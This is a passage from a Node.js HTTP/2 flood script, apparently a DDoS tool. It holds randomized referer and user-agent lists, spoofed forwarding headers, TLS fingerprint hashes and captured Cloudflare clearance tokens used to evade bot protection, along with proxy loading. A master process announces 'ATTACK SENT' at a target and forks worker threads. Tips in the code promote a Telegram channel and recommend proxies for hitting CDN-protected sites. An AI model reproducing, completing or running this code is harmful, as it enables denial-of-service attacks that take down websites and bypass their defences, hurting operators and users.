		"https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", 
		"https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", 
		"https://drive.google.com/viewerng/viewer?url=", 
		"http://www.google.com/translate?u=", 
		"https://developers.google.com/speed/pagespeed/insights/?url=", 
		"http://help.baidu.com/searchResult?keywords=", 
		"http://www.bing.com/search?q=", 
		"https://add.my.yahoo.com/rss?url=", 
		"https://play.google.com/store/search?q=", 
		"http://www.google.com/?q=", 
		"http://regex.info/exif.cgi?url=", 
		"http://anonymouse.org/cgi-bin/anon-www.cgi/", 
		"http://www.google.com/translate?u=", 
		"http://translate.google.com/translate?u=", 
		"http://validator.w3.org/feed/check.cgi?url=", 
		"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", 
		"http://validator.w3.org/check?uri=", 
		"http://jigsaw.w3.org/css-validator/validator?uri=", 
		"http://validator.w3.org/checklink?uri=", 
		"http://www.w3.org/RDF/Validator/ARPServlet?URI=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", 
		"http://validator.w3.org/mobile/check?docAddr=", 
		"http://validator.w3.org/p3p/20020128/p3p.pl?uri=", 
		"http://online.htmlvalidator.com/php/onlinevallite.php?url=", 
		"http://feedvalidator.org/check.cgi?url=", 
		"http://gmodules.com/ig/creator?url=", 
		"http://www.google.com/ig/adde?moduleurl=", 
		"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", 
		"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
		"http://host-tracker.com/check_page/?furl=", 
		"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
		"http://www.bing.com/search?q=", 
		"https://add.my.yahoo.com/rss?url=", 
		"https://play.google.com/store/search?q=", 
		"http://www.google.com/?q=", 
		"http://regex.info/exif.cgi?url=", 
		"http://anonymouse.org/cgi-bin/anon-www.cgi/", 
		"http://www.google.com/translate?u=", 
		"http://translate.google.com/translate?u=", 
		"http://validator.w3.org/feed/check.cgi?url=", 
		"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", 
		"http://validator.w3.org/check?uri=", 
		"http://jigsaw.w3.org/css-validator/validator?uri=", 
		"http://validator.w3.org/checklink?uri=", 
		"http://www.w3.org/RDF/Validator/ARPServlet?URI=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", 
		"http://validator.w3.org/mobile/check?docAddr=", 
		"http://validator.w3.org/p3p/20020128/p3p.pl?uri=", 
		"http://online.htmlvalidator.com/php/onlinevallite.php?url=", 
		"http://feedvalidator.org/check.cgi?url=", 
		"http://gmodules.com/ig/creator?url=", 
		"http://www.google.com/ig/adde?moduleurl=", 
		"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", 
		"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
		"http://host-tracker.com/check_page/?furl=", 
		"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
		"http://www.bing.com/search?q=", 
		"https://add.my.yahoo.com/rss?url=", 
		"https://play.google.com/store/search?q=", 
		"http://www.google.com/?q=", 
		"http://regex.info/exif.cgi?url=", 
		"http://anonymouse.org/cgi-bin/anon-www.cgi/", 
		"http://www.google.com/translate?u=", 
		"http://translate.google.com/translate?u=", 
		"http://validator.w3.org/feed/check.cgi?url=", 
		"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", 
		"http://validator.w3.org/check?uri=", 
		"http://jigsaw.w3.org/css-validator/validator?uri=", 
		"http://validator.w3.org/checklink?uri=", 
		"http://www.w3.org/RDF/Validator/ARPServlet?URI=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", 
		"http://validator.w3.org/mobile/check?docAddr=", 
		"http://validator.w3.org/p3p/20020128/p3p.pl?uri=", 
		"http://online.htmlvalidator.com/php/onlinevallite.php?url=", 
		"http://feedvalidator.org/check.cgi?url=", 
		"http://gmodules.com/ig/creator?url=", 
		"http://www.google.com/ig/adde?moduleurl=", 
		"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", 
		"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
		"http://host-tracker.com/check_page/?furl=", 
		"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
		"http://www.bing.com/search?q=", 
		"https://add.my.yahoo.com/rss?url=", 
		"https://play.google.com/store/search?q=", 
		"http://www.google.com/?q=", 
		"http://regex.info/exif.cgi?url=", 
		"http://anonymouse.org/cgi-bin/anon-www.cgi/", 
		"http://www.google.com/translate?u=", 
		"http://translate.google.com/translate?u=", 
		"http://validator.w3.org/feed/check.cgi?url=", 
		"http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=", 
		"http://validator.w3.org/check?uri=", 
		"http://jigsaw.w3.org/css-validator/validator?uri=", 
		"http://validator.w3.org/checklink?uri=", 
		"http://www.w3.org/RDF/Validator/ARPServlet?URI=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=", 
		"http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=", 
		"http://validator.w3.org/mobile/check?docAddr=", 
		"http://validator.w3.org/p3p/20020128/p3p.pl?uri=", 
		"http://online.htmlvalidator.com/php/onlinevallite.php?url=", 
		"http://feedvalidator.org/check.cgi?url=", 
		"http://gmodules.com/ig/creator?url=", 
		"https://check-host.net/",
		"http://www.google.com/ig/adde?moduleurl=", 
		"http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=", 
		"http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
		"http://host-tracker.com/check_page/?furl=", 
		"http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
 ];
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");

 const uap = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36 OPR/100.0.0.0',
        "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
 "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
 "portalmmm/2.0 N410i(c20;TB) ",
 "Python-urllib/2.5",
 "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
 "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
 "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
 "SearchExpress",
 "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
 "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
 "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
 "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
 "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonT100/R101",
 "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
 "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
 "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
 "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
 "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
 "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
 "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
 "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonT68/R201A",
 "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
 "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
 "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
 "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
 "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
 "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
 "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
 "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
 "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
 "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36' 
    ];

  platform = [
    'Macintosh',
    'Windows'
  ];
  methods = [
   "GET",
   "POST"
  ];

 version = [
    '"Chromium";v="116", "Not)A;Brand";v="8", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="8", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="8", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="8", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="8", "Google Chrome";v="112"',
    '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="24", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="24", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="24", "Google Chrome";v="112"',
    '"Chromium";v="116", "Not)A;Brand";v="99", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="99", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="99", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="99", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="99", "Google Chrome";v="112"'
 ];

 const a6 = [
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="112.0.0.0"',
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="112.0.0.0"',
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="112.0.0.0"',
 ];

const jalist = [
 "002205d0f96c37c5e660b9f041363c1",
 "073eede15b2a5a0302d823ecbd5ad15b",
 "0b61c673ee71fe9ee725bd687c455809",
 "6cd1b944f5885e2cfbe98a840b75eeb8",
 "94c485bca29d5392be53f2b8cf7f4304",
 "b4f4e6164f938870486578536fc1ffce",
 "b8f81673c0e1d29908346f3bab892b9b",
 "baaac9b6bf25ad098115c71c59d29e51",
 "bc6c386f480ee97b9d9e52d472b772d8",
 "da949afd9bd6df820730f8f171584a71",
 "f58966d34ff9488a83797b55c804724d",
 "fd6314b03413399e4f23d1524d206692",
 "0a81538cf247c104edb677bdb8902ed5",
 "0b6592fd91d4843c823b75e49b43838d",
 "0ffee3ba8e615ad22535e7f771690a28",
 "1c15aca4a38bad90f9c40678f6aface9",
 "5163bc7c08f57077bc652ec370459c2f",
 "a88f1426c4603f2a8cd8bb41e875cb75",
 "b03910cc6de801d2fcfa0c3b9f397df4",
 "bfcc1a3891601edb4f137ab7ab25b840",
 "ce694315cbb81ce95e6ae4ae8cbafde6",
 "f15797a734d0b4f171a86fd35c9a5e43"
];
const tips1 =[
 "use premium proxy will get more request/s",
 "this script only work on http/2!",
 "recommended big proxyfile if target is akamai/fastly",
 "dont leak memek @Stretzx",
 "My channel: https://t.me/PROOFC2"
];

  site = [
    'cross-site',
	'same-origin',
	'same-site',
	'none'
  ];
  
  mode = [
    'cors',
	'navigate',
	'no-cors',
	'same-origin'
  ];
  
  dest = [
    'document',
	'image',
	'embed',
	'empty',
	'frame'
  ];
const cookie = [
"--no-sandbox",
"--disable-setuid-sandbox",
"--disable-infobars",
"--disable-logging",
"--disable-login-animations",
"--disable-notifications",
"--disable-gpu",
"--headless",
"--lang=ko_KR",
"--start-maxmized",
"--ignore-certificate-errors",
"--hide-scrollbars",
"--mute-audio",
"--disable-web-security",
"--incognito",
"--disable-canvas-aa",
"--disable-2d-canvas-clip-aa",
"--disable-accelerated-2d-canvas",
"--no-zygote",
"--use-gl=desktop",
"--disable-gl-drawing-for-tests",
"--disable-dev-shm-usage",
"--no-first-run",
"--disable-features=IsolateOrigins,site-per-process",
"--ignore-certificate-errors-spki-list",
"--user-agent=Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
"cf_clearance",
"cf_clearance=mOvsqA7JGiSddvLfrKvg0VQ4ARYRoOK9qmQZ7xTjC9g-1698947194-0-1-67ed94c7.1e69758c.36e830ad-250.2.1698947194",
"?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
"?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
"?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
"?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
"?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
"?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
"?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
"?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
"?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
"?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
"?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
"?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
"?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
"?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
"?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
"?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
"?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
"?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
"?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U",
"?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
"?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
"?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
"?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
"?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
"?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
"?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
"?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
"?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs",
"__gads=ID=5aa94fb83f51b15e-2281bc2fbae7006b:T=1691587735:RT=1695159062:S=ALNI_MZOOrSx-eW0eoKcCr1obUsUuHDxSw; __gpi=UID=00000c29bf4da4a2:T=1691587735:RT=1695159062:S=ALNI_MbRreNJ-uYMyj9DbNsEIN9hOJdzRw', '__gads=ID=a643d2eb7e5a1d7c-222369de26e300e6:T=1693161840:RT=1695124303:S=ALNI_MYEGaAPV1XRj7t0-yqcLDQ26ONBqw; __gpi=UID=00000c34e6ad6a0f:T=1693161840:RT=1695124303:S=ALNI_MaZphGHvqhWidGx3UrhD6IE1Vdp1g",
];
const CookieCf = cookie[Math.floor(Math.random() * cookie.length)];
 
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
 var jar = jalist[Math.floor(Math.floor(Math.random() * jalist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var tipsz = tips1[Math.floor(Math.floor(Math.random() * tips1.length))];
 var a = a6[Math.floor(Math.floor(Math.random() * a6.length))];
 var methodd = methods[Math.floor(Math.floor(Math.random() * methods.length))];
 var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
 var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
 var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
 var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
 var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 //var uar = readLines(args.ua);
 //var uar1 = uar[Math.floor(Math.floor(Math.random() * uar.length))];
 const parsedTarget = url.parse(args.target);

const rateHeaders = [
{ "A-IM": "Feed" },
{ "accept": accept },
{ "accept-charset": accept },
{ "accept-datetime": accept },
{ "accept-encoding": encoding },
{ "accept-language": lang },
{ "upgrade-insecure-requests": "1" },
{ "Access-Control-Request-Method": "GET" },
{ "Cache-Control": "no-cache" },
{ "Content-Encoding": "gzip" },
{ "content-type": "text/html" },
{ "cookie": randstr(15) },
{ "Expect": "100-continue" },
{ "Forwarded": "for=192.168.0.1;proto=http;by=" + spoofed },
{ "From": "user@gmail.com" },
{ "Max-Forwards": "10" },
{ "origin": "https://" + parsedTarget.host },
{ "pragma": "no-cache" },
{ "referer": "https://" + parsedTarget.host + "/" },
];

const rateHeaders2 = [
{ "Via": "1.1 " + parsedTarget.host },
{ "X-Requested-With": "XMLHttpRequest" },
{ "X-Forwarded-For": spoofed },
{ "X-Vercel-Cache": randstr(15) },
{ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + "; ma=7200" },
{ "TK": "?" },
{ "X-Frame-Options": "deny" },
{ "X-ASP-NET": randstr(25) },
{ "Refresh": "5" },
{ "X-Content-duration": spoofed },
{ "service-worker-navigation-preload": Math.random() < 0.5 ? 'true' : 'null' },
];

 if (cluster.isMaster) {
    console.clear()
    console.log(`ATTACK SENT)`.rainbow)
    console.log(`--------------------------------------------`.gray)
    console.log(`Target: `.brightYellow + process.argv[2])
    console.log(`--------------------------------------------`.gray)
    console.log(`Note: `.brightCyan + tipsz)
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
